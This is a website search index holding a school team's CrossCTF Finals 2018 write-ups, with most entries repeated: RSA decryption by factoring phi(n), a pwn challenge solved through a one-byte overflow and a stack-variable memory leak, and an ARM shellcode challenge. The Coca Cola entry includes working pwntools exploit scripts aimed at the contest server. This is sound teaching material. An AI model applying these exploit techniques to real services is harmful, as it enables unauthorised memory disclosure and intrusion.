{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"/","text":"OSI Layer 8 CTF Team from NUS High School This website contains a collection of writeups for challenges our team solved.","title":"OSI Layer 8"},{"location":"/#osi-layer-8","text":"CTF Team from NUS High School This website contains a collection of writeups for challenges our team solved.","title":"OSI Layer 8"},{"location":"/crossctf-finals2018/crypto/babyrsa3/","text":"CrossCTF Finals 2018 : BabyRSA3 (crypto) So I heard that you can flip the private and public information for RSA... Creator - prokarius (@prokarius) We are given a file outNerfed.txt , which contains c , the ciphertext, d , the private exponent and phi(n) , which is equal to (p-1)(q-1) . Challenge To decrypt the ciphertext, we will need d and n . So the challenge here is to find a way to get n from phi(n) . Solution Factorization To get n from phi(n) , the most sensical step is to find p-1 and q-1 , so that we can find n=pq . We tried to use yafu to do it, and it worked very nicely. daniel@daniel \ue0b0 ~/Downloads/yafu \ue0b0 ./yafu 'factor(25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492)' fac: factoring 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C346 rho: x^2 + 2, starting 1000 iterations on C346 rho: x^2 + 1, starting 1000 iterations on C346 pm1: starting B1 = 150K, B2 = gmp-ecm default on C346 ecm: 0/30 curves on C334, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C322, B1=2K, B2=gmp-ecm default ecm: 0/28 curves on C310, B1=2K, B2=gmp-ecm default ecm: 0/27 curves on C272, B1=2K, B2=gmp-ecm default ecm: 0/26 curves on C259, B1=2K, B2=gmp-ecm default ecm: 1/25 curves on C246, B1=2K, B2=gmp-ecm default ecm: 0/23 curves on C221, B1=2K, B2=gmp-ecm default ecm: 1/22 curves on C196, B1=2K, B2=gmp-ecm default ecm: 1/20 curves on C183, B1=2K, B2=gmp-ecm default ecm: 0/18 curves on C170, B1=2K, B2=gmp-ecm default ecm: 2/17 curves on C157, B1=2K, B2=gmp-ecm default ecm: 3/14 curves on C144, B1=2K, B2=gmp-ecm default ecm: 1/10 curves on C132, B1=2K, B2=gmp-ecm default ecm: 8/8 curves on C119, B1=2K, B2=gmp-ecm default ecm: 3/74 curves on C119, B1=11K, B2=gmp-ecm default fac: factoring 48636585985082768736526784024200750021 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C38 rho: x^2 + 2, starting 1000 iterations on C38 rho: x^2 + 1, starting 1000 iterations on C38 pm1: starting B1 = 150K, B2 = gmp-ecm default on C38 ecm: 0/30 curves on C38, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.1867 seconds fac: factoring 52537838568268884632273629 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C26 rho: x^2 + 2, starting 1000 iterations on C26 rho: x^2 + 1, starting 1000 iterations on C26 pm1: starting B1 = 150K, B2 = gmp-ecm default on C26 ecm: 1/30 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.2959 seconds fac: factoring 9434943930960179869296047 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C25 rho: x^2 + 2, starting 1000 iterations on C25 rho: x^2 + 1, starting 1000 iterations on C25 pm1: starting B1 = 150K, B2 = gmp-ecm default on C25 ecm: 1/30 curves on C25, B1=2K, B2=gmp-ecm default Total factoring time = 0.2060 seconds Total factoring time = 4.6255 seconds ***factors found*** P1 = 2 P1 = 2 P13 = 2767687179787 P12 = 333600482773 P13 = 6938103821809 P13 = 3680247726403 P13 = 8313722160551 P13 = 6438418759151 P13 = 6545600536253 P13 = 6672422609813 P13 = 6579600728639 P13 = 3639128890921 P13 = 9566431650679 P13 = 9220079755217 P106 = 2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051 P13 = 4065711354007 P13 = 1973804930501 P13 = 6060693342503 P13 = 7265658595571 P13 = 7230980905199 P13 = 4754509728797 P13 = 1984419944251 ans = 1 Cleaning up the output, and putting them into a python script a = [] a.append(2) a.append(2) a.append(2767687179787) a.append(7230980905199) a.append(3680247726403) a.append(7265658595571) a.append(6545600536253) a.append(6579600728639) a.append(3639128890921) a.append(333600482773) a.append(9220079755217) a.append(8313722160551) a.append(9566431650679) a.append(6938103821809) a.append(6438418759151) a.append(2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051) a.append(4754509728797) a.append(6672422609813) a.append(1973804930501) a.append(6060693342503) a.append(1984419944251) a.append(4065711354007) c = 5499541793182458916572235549176816842668241174266452504513113060755436878677967801073969318886578771261808846567771826513941339489235903308596884669082743082338194484742630141310604711117885643229642732544775605225440292634865971099525895746978617397424574658645139588374017720075991171820873126258830306451326541384750806605195470098194462985494 d = 15664449102383123741256492823637853135125214807384742239549570131336662433268993001893338579081447660916548171028888182200587902832321164315176336792229529488626556438838274357507327295590873540152237706572328731885382033467068457038670389341764040515475556103158917133155868200492242619473451848383350924192696773958592530565397202086200003936447 phi = 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492 Find n Now, we just need to split the factors into 2 sets, satisfying the condition that the product of the integers in each set, added by 1, will be a prime number. In other words, split the factors we got into p-1 and q-1 , while making sure that p and q are both prime. To do so, we can use itertools.combinations to generate different combinations of factors, and check if they fit the conditions above. Once we managed to find the p and q we need, all we need is to do left is find m = c ^ d % n . import itertools import gmpy2 def P(a): return reduce(lambda x, y: x*y, a) for n in range(1, 12): for i in itertools.combinations(a, n): // check if p and q are prime if (gmpy2.is_prime(P(i) + 1)) and gmpy2.is_prime(phi / P(i) + 1): p = P(i) + 1 q = phi / P(i) + 1 // found n, decrypt the ciphertext n = p * q plain = gmpy2.powmod(c, d, n) print hex(plain)[2:].decode('hex') exit()","title":"CrossCTF Finals 2018 : BabyRSA3 (crypto)"},{"location":"/crossctf-finals2018/crypto/babyrsa3/#crossctf-finals-2018-babyrsa3-crypto","text":"So I heard that you can flip the private and public information for RSA... Creator - prokarius (@prokarius) We are given a file outNerfed.txt , which contains c , the ciphertext, d , the private exponent and phi(n) , which is equal to (p-1)(q-1) .","title":"CrossCTF Finals 2018 : BabyRSA3 (crypto)"},{"location":"/crossctf-finals2018/crypto/babyrsa3/#challenge","text":"To decrypt the ciphertext, we will need d and n . So the challenge here is to find a way to get n from phi(n) .","title":"Challenge"},{"location":"/crossctf-finals2018/crypto/babyrsa3/#solution","text":"","title":"Solution"},{"location":"/crossctf-finals2018/crypto/babyrsa3/#factorization","text":"To get n from phi(n) , the most sensical step is to find p-1 and q-1 , so that we can find n=pq . We tried to use yafu to do it, and it worked very nicely. daniel@daniel \ue0b0 ~/Downloads/yafu \ue0b0 ./yafu 'factor(25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492)' fac: factoring 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C346 rho: x^2 + 2, starting 1000 iterations on C346 rho: x^2 + 1, starting 1000 iterations on C346 pm1: starting B1 = 150K, B2 = gmp-ecm default on C346 ecm: 0/30 curves on C334, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C322, B1=2K, B2=gmp-ecm default ecm: 0/28 curves on C310, B1=2K, B2=gmp-ecm default ecm: 0/27 curves on C272, B1=2K, B2=gmp-ecm default ecm: 0/26 curves on C259, B1=2K, B2=gmp-ecm default ecm: 1/25 curves on C246, B1=2K, B2=gmp-ecm default ecm: 0/23 curves on C221, B1=2K, B2=gmp-ecm default ecm: 1/22 curves on C196, B1=2K, B2=gmp-ecm default ecm: 1/20 curves on C183, B1=2K, B2=gmp-ecm default ecm: 0/18 curves on C170, B1=2K, B2=gmp-ecm default ecm: 2/17 curves on C157, B1=2K, B2=gmp-ecm default ecm: 3/14 curves on C144, B1=2K, B2=gmp-ecm default ecm: 1/10 curves on C132, B1=2K, B2=gmp-ecm default ecm: 8/8 curves on C119, B1=2K, B2=gmp-ecm default ecm: 3/74 curves on C119, B1=11K, B2=gmp-ecm default fac: factoring 48636585985082768736526784024200750021 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C38 rho: x^2 + 2, starting 1000 iterations on C38 rho: x^2 + 1, starting 1000 iterations on C38 pm1: starting B1 = 150K, B2 = gmp-ecm default on C38 ecm: 0/30 curves on C38, B1=2K, B2=gmp-ecm default ecm: 0/29 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.1867 seconds fac: factoring 52537838568268884632273629 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C26 rho: x^2 + 2, starting 1000 iterations on C26 rho: x^2 + 1, starting 1000 iterations on C26 pm1: starting B1 = 150K, B2 = gmp-ecm default on C26 ecm: 1/30 curves on C26, B1=2K, B2=gmp-ecm default Total factoring time = 0.2959 seconds fac: factoring 9434943930960179869296047 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits div: primes less than 10000 fmt: 1000000 iterations rho: x^2 + 3, starting 1000 iterations on C25 rho: x^2 + 2, starting 1000 iterations on C25 rho: x^2 + 1, starting 1000 iterations on C25 pm1: starting B1 = 150K, B2 = gmp-ecm default on C25 ecm: 1/30 curves on C25, B1=2K, B2=gmp-ecm default Total factoring time = 0.2060 seconds Total factoring time = 4.6255 seconds ***factors found*** P1 = 2 P1 = 2 P13 = 2767687179787 P12 = 333600482773 P13 = 6938103821809 P13 = 3680247726403 P13 = 8313722160551 P13 = 6438418759151 P13 = 6545600536253 P13 = 6672422609813 P13 = 6579600728639 P13 = 3639128890921 P13 = 9566431650679 P13 = 9220079755217 P106 = 2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051 P13 = 4065711354007 P13 = 1973804930501 P13 = 6060693342503 P13 = 7265658595571 P13 = 7230980905199 P13 = 4754509728797 P13 = 1984419944251 ans = 1 Cleaning up the output, and putting them into a python script a = [] a.append(2) a.append(2) a.append(2767687179787) a.append(7230980905199) a.append(3680247726403) a.append(7265658595571) a.append(6545600536253) a.append(6579600728639) a.append(3639128890921) a.append(333600482773) a.append(9220079755217) a.append(8313722160551) a.append(9566431650679) a.append(6938103821809) a.append(6438418759151) a.append(2293498615990071511610820895302086940796564989168281123737588839386922876088484808070018553110125686555051) a.append(4754509728797) a.append(6672422609813) a.append(1973804930501) a.append(6060693342503) a.append(1984419944251) a.append(4065711354007) c = 5499541793182458916572235549176816842668241174266452504513113060755436878677967801073969318886578771261808846567771826513941339489235903308596884669082743082338194484742630141310604711117885643229642732544775605225440292634865971099525895746978617397424574658645139588374017720075991171820873126258830306451326541384750806605195470098194462985494 d = 15664449102383123741256492823637853135125214807384742239549570131336662433268993001893338579081447660916548171028888182200587902832321164315176336792229529488626556438838274357507327295590873540152237706572328731885382033467068457038670389341764040515475556103158917133155868200492242619473451848383350924192696773958592530565397202086200003936447 phi = 25744472610420721576721354142700666534585707423276540379553111662924462766649397845238736588395849560582824664399879219093936415146333463826035714360316647265405615591383999147878527778914526369981160444050742606139799706884875928674153255909145624833489266194817757115584913491575124670523917871310421296173148930930573096639196103714702234087492","title":"Factorization"},{"location":"/crossctf-finals2018/crypto/babyrsa3/#find-n","text":"Now, we just need to split the factors into 2 sets, satisfying the condition that the product of the integers in each set, added by 1, will be a prime number. In other words, split the factors we got into p-1 and q-1 , while making sure that p and q are both prime. To do so, we can use itertools.combinations to generate different combinations of factors, and check if they fit the conditions above. Once we managed to find the p and q we need, all we need is to do left is find m = c ^ d % n . import itertools import gmpy2 def P(a): return reduce(lambda x, y: x*y, a) for n in range(1, 12): for i in itertools.combinations(a, n): // check if p and q are prime if (gmpy2.is_prime(P(i) + 1)) and gmpy2.is_prime(phi / P(i) + 1): p = P(i) + 1 q = phi / P(i) + 1 // found n, decrypt the ciphertext n = p * q plain = gmpy2.powmod(c, d, n) print hex(plain)[2:].decode('hex') exit()","title":"Find n"},{"location":"/crossctf-finals2018/pwn/cocacola/","text":"CrossCTF Finals 2018 : Coca Cola (Pwn) First Blood by : TinyBoxer Catch the Wave. Coke! nc ctf.pwn.sg 4001 Creator - amon (@nn_amon) Static Analysis Running file cocacola gives: cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped Now on to the code ... int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int result; // eax __off_t v5; // rsi int fd; // [rsp+Ch] [rbp-B4h] struct stat stat_buf; // [rsp+20h] [rbp-A0h] unsigned __int64 v8; // [rsp+B8h] [rbp-8h] v8 = __readfsqword(0x28u); // these are canaries btw setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering v3 = time(0LL); srand(v3); //initalize random seed fd = open( flag_page , 0, 384LL); memset( stat_buf, 0, sizeof(stat_buf)); if ( fstat(fd, stat_buf) == -1 ) { perror( Error getting the file size ); result = -1; } else { v5 = stat_buf.st_size; mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL); printf( Do you want to flip the flag switch? (y/n) ); __isoc99_scanf((__int64) %2s , (__int64) flag); coca(); cola(); puts( Did you get it? If not try again. ); result = 0; } return result; } The program opens a file called flag_page . It clears out a stat_buf region of memory, then uses as a stat struct when fstat(fd, stat_buf) is called. If fstat succeeds, mmap(0x700B100, stats_buf.size, 1, 1, fd, 0) is called. Looking at mmap documentation , we see that the two 1 s that are in the earlier mmap call are for the prot and flags arguments. However, note that for the fd argument, we are passing flag_page 's fd, intending to copy the file content into our allocated memory. Next, it asks us about flipping flag switches (to which the answer is not y , as we will see later). It reads in 2 bytes into the flag global variable then proceeds to call coca() and then cola() unsigned __int64 coca() { char buf; // [rsp+0h] [rbp-110h] unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); puts(art); read(0, buf, 0xFFuLL); if ( flag_denied == 0xC5u ) read(0, something, 1uLL); return __readfsqword(0x28u) ^ v2; } We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable flag_denied is compared to 0xc5 , and if it equal we read 1 byte into something , another global variable. unsigned __int64 cola() { int v0; // eax signed __int64 v2; // [rsp+0h] [rbp-60h] signed __int64 v3; // [rsp+8h] [rbp-58h] __int64 v4; // [rsp+10h] [rbp-50h] __int64 v5; // [rsp+18h] [rbp-48h] __int64 v6; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] __int64 v8; // [rsp+30h] [rbp-30h] int v9; // [rsp+38h] [rbp-28h] __int16 v10; // [rsp+3Ch] [rbp-24h] const char *v11; // [rsp+48h] [rbp-18h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); v0 = rand(); v3 = v0 - 10000000000LL * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) 64) 27) - ((signed __int64)v0 63)) + 1; if ( something ) { v2 = '\\x137'; strcpy(v4, Limited Edition Coca Cola - Product of Mexico ); v11 = (__int64) Invalid internal error. ; } puts( Here's your randomly generated coke can! ); printf( Version: V.%lu\\n , v2, v2); printf( Serial Number: %lu\\n , v3); printf( Title: %s\\n , v4); if ( flag == 0x44 v11 ) { puts( Errors were found. ); printf( Error: %s\\n , v11); } return __readfsqword(0x28u) ^ v12; } In this method, we get a random number then do some math to get produce another value, then save it into v3 . If something is true, we initalize variables v2 , v4 and v11 . Note that v11 has a pointer to some string, not the string itself. Next, we print out some info, then check if the flag variable is 0x44 and if v11 isn't NULL , and print v11 out in a print(\"Error: %s\\n\") . Solution We see that if something is 0 , when we print out info in cola() , it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main- coca is on the same 'level' as main- cola but main- cola is not on the same 'level' as main- cola- puts). That function is coca() , based on main()'s code. If we look at the read(0, buf, 0xff) , we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in cola() are from rbp-0x60 onwards, so we can see that we can control all the variables in cola except v0 , v3 and v12 . Note that cola() prints out v11 in printf(\"Error: %s\\n\", v11) , interpreting it as a string, as long as flag is 0x44 . Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of flag_page by setting v11 to 0x700B1000 So far, we need to set flag to 0x44 , something to 0, and we also need to set v11 to 0x700B10000 (this can be done in coca() 's read(0, buf, 0xff) ) Checking the program, we see that something is actually 1 by default .data:00000000002117F8 something db 1 The only place we can change something is in coca() : if ( flag_denied == 0xC5u ) read(0, something, 1uLL); and it seems we need to set flag_denied to 0xc5 first. However, flag_denied is 0 by default, and there is no other place where it is set: .bss:00000000002117FD public flag .bss:00000000002117FD flag db ? ; ; DATA XREF: cola+12E\u2191o .bss:00000000002117FD ; main+14A\u2191o .bss:00000000002117FE public flag_denied .bss:00000000002117FE flag_denied db ? ; ; DATA XREF: coca+42\u2191o .bss:00000000002117FF db ? ; Hold on, dont we read 2 bytes into flag in main() ? Here it says that flag is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into flag_denied . So far, the plan is: Set flag and flag_denied to 0x44 and 0xc5 respectively, by sending \\x44\\xc5 to __isoc99_scanf((__int64)\"%2s\", (__int64) flag); in main() . Then, set v11 (at rbp-0x18) to 0x700B1000 in read(0, buf, 0xff) in coca() (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding). Thus, we send 'a'*0xf8+p64(0x700B1000+i*32)[:-1] . The [:-1] is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). Next, we send \\x00 to read(0, something, 1) Putting it all together: from pwn import * p = remote('ctf.pwn.sg', 4001) p.sendafter( Do you want to flip the flag switch? (y/n) , '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000)[:-1]) p.send('\\x00') p.recvuntil('Error: ') print(p.recvline()) However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the puts(\"Did you get it? If not try again.\"); in main() imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character). Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early. from pwn import * s = '' for i in range(50): try: p = remote('ctf.pwn.sg', 4001) p.sendafter( Do you want to flip the flag switch? (y/n) , '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1]) p.send('\\x00') p.recvuntil('Error: ') s += p.recv(1) except: break print(s)","title":"CrossCTF Finals 2018 : Coca Cola (Pwn)"},{"location":"/crossctf-finals2018/pwn/cocacola/#crossctf-finals-2018-coca-cola-pwn","text":"","title":"CrossCTF Finals 2018 : Coca Cola (Pwn)"},{"location":"/crossctf-finals2018/pwn/cocacola/#first-blood-by-tinyboxer","text":"Catch the Wave. Coke! nc ctf.pwn.sg 4001 Creator - amon (@nn_amon)","title":"First Blood by : TinyBoxer"},{"location":"/crossctf-finals2018/pwn/cocacola/#static-analysis","text":"Running file cocacola gives: cocacola: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=76986b77e7025662406398594dd7c100f7e35c16, not stripped Now on to the code ... int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int result; // eax __off_t v5; // rsi int fd; // [rsp+Ch] [rbp-B4h] struct stat stat_buf; // [rsp+20h] [rbp-A0h] unsigned __int64 v8; // [rsp+B8h] [rbp-8h] v8 = __readfsqword(0x28u); // these are canaries btw setvbuf(stdin, 0LL, 2, 0LL); //disallows buffering setvbuf(stdout, 0LL, 2, 0LL);//disallows buffering setvbuf(stderr, 0LL, 2, 0LL);//disallows buffering v3 = time(0LL); srand(v3); //initalize random seed fd = open( flag_page , 0, 384LL); memset( stat_buf, 0, sizeof(stat_buf)); if ( fstat(fd, stat_buf) == -1 ) { perror( Error getting the file size ); result = -1; } else { v5 = stat_buf.st_size; mmap((void *)0x700B1000, stat_buf.st_size, 1, 1, fd, 0LL); printf( Do you want to flip the flag switch? (y/n) ); __isoc99_scanf((__int64) %2s , (__int64) flag); coca(); cola(); puts( Did you get it? If not try again. ); result = 0; } return result; } The program opens a file called flag_page . It clears out a stat_buf region of memory, then uses as a stat struct when fstat(fd, stat_buf) is called. If fstat succeeds, mmap(0x700B100, stats_buf.size, 1, 1, fd, 0) is called. Looking at mmap documentation , we see that the two 1 s that are in the earlier mmap call are for the prot and flags arguments. However, note that for the fd argument, we are passing flag_page 's fd, intending to copy the file content into our allocated memory. Next, it asks us about flipping flag switches (to which the answer is not y , as we will see later). It reads in 2 bytes into the flag global variable then proceeds to call coca() and then cola() unsigned __int64 coca() { char buf; // [rsp+0h] [rbp-110h] unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); puts(art); read(0, buf, 0xFFuLL); if ( flag_denied == 0xC5u ) read(0, something, 1uLL); return __readfsqword(0x28u) ^ v2; } We begin by printing some pretty art, after which we read in 255 bytes into memory. Checking the offsets, we see that there is no overflow here. Next, a global variable flag_denied is compared to 0xc5 , and if it equal we read 1 byte into something , another global variable. unsigned __int64 cola() { int v0; // eax signed __int64 v2; // [rsp+0h] [rbp-60h] signed __int64 v3; // [rsp+8h] [rbp-58h] __int64 v4; // [rsp+10h] [rbp-50h] __int64 v5; // [rsp+18h] [rbp-48h] __int64 v6; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] __int64 v8; // [rsp+30h] [rbp-30h] int v9; // [rsp+38h] [rbp-28h] __int16 v10; // [rsp+3Ch] [rbp-24h] const char *v11; // [rsp+48h] [rbp-18h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); v0 = rand(); v3 = v0 - 10000000000LL * (((signed __int64)((unsigned __int128)(0x36F9BFB3AF7B757LL * (signed __int128)v0) 64) 27) - ((signed __int64)v0 63)) + 1; if ( something ) { v2 = '\\x137'; strcpy(v4, Limited Edition Coca Cola - Product of Mexico ); v11 = (__int64) Invalid internal error. ; } puts( Here's your randomly generated coke can! ); printf( Version: V.%lu\\n , v2, v2); printf( Serial Number: %lu\\n , v3); printf( Title: %s\\n , v4); if ( flag == 0x44 v11 ) { puts( Errors were found. ); printf( Error: %s\\n , v11); } return __readfsqword(0x28u) ^ v12; } In this method, we get a random number then do some math to get produce another value, then save it into v3 . If something is true, we initalize variables v2 , v4 and v11 . Note that v11 has a pointer to some string, not the string itself. Next, we print out some info, then check if the flag variable is 0x44 and if v11 isn't NULL , and print v11 out in a print(\"Error: %s\\n\") .","title":"Static Analysis"},{"location":"/crossctf-finals2018/pwn/cocacola/#solution","text":"We see that if something is 0 , when we print out info in cola() , it prints out values that are uninitialized. Usually, these are values from the previous function call that is made at the same 'level' as the current function (e.g main- coca is on the same 'level' as main- cola but main- cola is not on the same 'level' as main- cola- puts). That function is coca() , based on main()'s code. If we look at the read(0, buf, 0xff) , we see that it reads 0xff bytes into buf, which is at rbp-0x110. All the variables in cola() are from rbp-0x60 onwards, so we can see that we can control all the variables in cola except v0 , v3 and v12 . Note that cola() prints out v11 in printf(\"Error: %s\\n\", v11) , interpreting it as a string, as long as flag is 0x44 . Thus, we can print out arbitrary memory since we can control v11! We can even print out the contents of flag_page by setting v11 to 0x700B1000 So far, we need to set flag to 0x44 , something to 0, and we also need to set v11 to 0x700B10000 (this can be done in coca() 's read(0, buf, 0xff) ) Checking the program, we see that something is actually 1 by default .data:00000000002117F8 something db 1 The only place we can change something is in coca() : if ( flag_denied == 0xC5u ) read(0, something, 1uLL); and it seems we need to set flag_denied to 0xc5 first. However, flag_denied is 0 by default, and there is no other place where it is set: .bss:00000000002117FD public flag .bss:00000000002117FD flag db ? ; ; DATA XREF: cola+12E\u2191o .bss:00000000002117FD ; main+14A\u2191o .bss:00000000002117FE public flag_denied .bss:00000000002117FE flag_denied db ? ; ; DATA XREF: coca+42\u2191o .bss:00000000002117FF db ? ; Hold on, dont we read 2 bytes into flag in main() ? Here it says that flag is only 1 byte (Note the addresses in left. My tool repeats addresses when delivering information to give .. more information). Thus, we have a overflow, and we can write 1 byte into flag_denied . So far, the plan is: Set flag and flag_denied to 0x44 and 0xc5 respectively, by sending \\x44\\xc5 to __isoc99_scanf((__int64)\"%2s\", (__int64) flag); in main() . Then, set v11 (at rbp-0x18) to 0x700B1000 in read(0, buf, 0xff) in coca() (buf is rbp-0x110, so we have 0x110-0x18 = 0xf8 characters of padding). Thus, we send 'a'*0xf8+p64(0x700B1000+i*32)[:-1] . The [:-1] is to leave out the last character, as p64() gives 8 bytes but we can only afford to send 7 bytes (0ff-0f8 = 7). Next, we send \\x00 to read(0, something, 1) Putting it all together: from pwn import * p = remote('ctf.pwn.sg', 4001) p.sendafter( Do you want to flip the flag switch? (y/n) , '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000)[:-1]) p.send('\\x00') p.recvuntil('Error: ') print(p.recvline()) However ... we get 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC', which isn't the flag, obviously. But 'C' is the first letter of the flag that we expect. Perhaps the file has null bytes that force printf() to stop printing, and the each character of the flag is repeated as above, followed by a null byte? This, along with the puts(\"Did you get it? If not try again.\"); in main() imply that we have to repeat our exploit for each character in the flag (we also need to offset our value to v11 by 32*i, where i is the index of the character). Since we don't know how long the flag is, we just repeat our exploit, for example, 50 times and print what we have so far if the program segfaults early. from pwn import * s = '' for i in range(50): try: p = remote('ctf.pwn.sg', 4001) p.sendafter( Do you want to flip the flag switch? (y/n) , '\\x44\\xC5') p.send('a'*0xf8+p64(0x700B1000+i*32)[:-1]) p.send('\\x00') p.recvuntil('Error: ') s += p.recv(1) except: break print(s)","title":"Solution"},{"location":"/crossctf-finals2018/pwn/ftlog/","text":"CrossCTF Finals 2018 : FTLOG (Pwn) First Blood by : OSI Layer 8 https://youtu.be/RW2vXFLXtps nc ctf.pwn.sg 4004 Hint: The raspberry Pis might come in handy but you can look at using qemu too. Creator - amon (@nn_amon) Static Analysis Running file ftlog gives: ftlog: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c3d8b29303d27686f7190bf2e3d88fc857517a3b, not stripped The binary is ARM, so I expected it to be hard to run/debug the program locally. Luckily, pwntools can emulate other architectures using qemu , so at the very least we can run the challenge locally. The code for the challenge is as follows: int __cdecl main(int argc, const char **argv, const char **envp) { void (__fastcall *v3)(int); // ST00_4 int v4; // r0 puts( art, argv, envp); v3 = (void (__fastcall *)(int))malloc(512); mprotect(v3, 512, 7); v4 = read(0, v3, 512); v3(v4); return 0; } The prints out some art , then allocates memory and marks it as executable ( mprotect(v3, 512, 7) = mprotect(memory, memory_size, PROT_READ | PROT_WRITE | PROT_EXEC) ). Then, it reads in some input to the memory and executes our input. In other words, this is a simple shellcode challenge, but for ARM. Solution The solution is to simply send in some ARM shellcode to spawn shell, then interact with it. Solution code in here P.S. I still have no idea what the YouTube link is for","title":"CrossCTF Finals 2018 : FTLOG (Pwn)"},{"location":"/crossctf-finals2018/pwn/ftlog/#crossctf-finals-2018-ftlog-pwn","text":"","title":"CrossCTF Finals 2018 : FTLOG (Pwn)"},{"location":"/crossctf-finals2018/pwn/ftlog/#first-blood-by-osi-layer-8","text":"https://youtu.be/RW2vXFLXtps nc ctf.pwn.sg 4004 Hint: The raspberry Pis might come in handy but you can look at using qemu too. Creator - amon (@nn_amon)","title":"First Blood by : OSI Layer 8"},{"location":"/crossctf-finals2018/pwn/ftlog/#static-analysis","text":"Running file ftlog gives: ftlog: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=c3d8b29303d27686f7190bf2e3d88fc857517a3b, not stripped The binary is ARM, so I expected it to be hard to run/debug the program locally. Luckily, pwntools can emulate other architectures using qemu , so at the very least we can run the challenge locally. The code for the challenge is as 